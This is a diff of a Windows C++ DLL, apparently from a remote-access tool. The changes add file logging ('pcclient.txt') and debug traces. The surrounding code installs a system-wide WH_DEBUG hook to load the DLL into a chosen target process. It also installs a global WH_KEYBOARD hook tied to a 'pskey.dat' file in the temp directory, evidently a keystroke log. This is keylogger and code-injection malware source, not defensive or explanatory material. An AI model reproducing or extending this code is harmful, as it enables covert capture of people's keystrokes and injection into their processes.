@@ -1,7 +1,6 @@
 
 #include "stdafx.h"
 #include "SshWork.h"
-
 #pragma data_seg("Shared")
 char   m_CharFileName[256] = {0};
 HHOOK  g_hook = NULL;
@@ -13,7 +12,16 @@ BOOL m_IsOk = FALSE;
 
 HINSTANCE ghInstance = NULL;
 SshWork   m_Work;
-
+static void WriteLog(char* message)
+{
+	FILE* fp = fopen("pcclient.txt", "a");
+	if (fp != NULL)
+	{
+		fwrite(message, strlen(message), 1, fp);
+		fwrite("\n", 2, 1, fp);
+		fclose(fp);
+	}
+}
 BOOL APIENTRY DllMain( HANDLE hModule, 
                        DWORD  ul_reason_for_call, 
                        LPVOID lpReserved
@@ -24,8 +32,14 @@ BOOL APIENTRY DllMain( HANDLE hModule,
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
 		case DLL_PROCESS_DETACH:
+			//fclose(stdout);
+			//FreeConsole();
 			break;
 		case DLL_PROCESS_ATTACH:
+			//AllocConsole();
+			//freopen("CONOUT$", "w+t", stdout);
+			//printf("temp");
+			WriteLog("init");
 			ghInstance = (HINSTANCE) hModule;
 			break;
 		default : break;
@@ -35,11 +49,15 @@ BOOL APIENTRY DllMain( HANDLE hModule,
 
 LRESULT WINAPI GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam) 
 {
-	LRESULT lResult = CallNextHookEx(g_hook, nCode, wParam, lParam);
 
+	//printf("1function getmsgproc :%d %llu %llu", nCode, wParam, lParam);
+	LRESULT lResult = CallNextHookEx(g_hook, nCode, wParam, lParam);
+	WriteLog("2212165");
 	//查看是否为指定进程
 	if(!m_IsOk && m_InitInfo.m_ProcessId == GetCurrentProcessId())
 	{
+		WriteLog("1111111111");
+		//printf("2function getmsgproc :%d %llu %llu", nCode, wParam, lParam);
 		//找到指定进程取消hook
 		m_IsOk = TRUE;
 		if(g_hook) UnhookWindowsHookEx(g_hook);
@@ -71,18 +89,23 @@ BOOL PlayWork(LPINITDLLINFO pInitInfo)
 	//拷贝数据
 	memcpy(&m_InitInfo,pInitInfo,sizeof(INITDLLINFO));
 
+	WriteLog("process start1");
 	//自进程启动
 	if(pInitInfo->m_ProcessName[0] == 2)
 	{
+		WriteLog("process start2");
 		m_Work.StartWork(&m_InitInfo);
 		return TRUE;
 	}
+	WriteLog("process start3");
 
 	//检查是否已经启动
 	if(g_hook != NULL) return FALSE;
 
+	WriteLog("start hook");
 	//启动HOOK
 	g_hook = SetWindowsHookEx(WH_DEBUG, GetMsgProc, ghInstance, 0);
+	WriteLog("end hook");
 	return (g_hook != NULL);
 }
 
@@ -139,10 +162,16 @@ LRESULT WINAPI GetKeyMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 BOOL KeyStartMyWork()
 {
+	WriteLog("KeyStartMyWork start ");
 	if(g_khook != NULL) return FALSE;
+	
 	GetTempPath(200,m_CharFileName);
 	strcat(m_CharFileName,"pskey.dat");
+	WriteLog("KeyStartMyWork start2 ");
 	g_khook = SetWindowsHookEx(WH_KEYBOARD,GetKeyMsgProc,ghInstance,0);
+	char log[255];
+	sprintf(log, "start3 ghook %s", g_khook == NULL ? "null" : "not null");
+	WriteLog(log);
 	return (g_khook != NULL);
 }
 
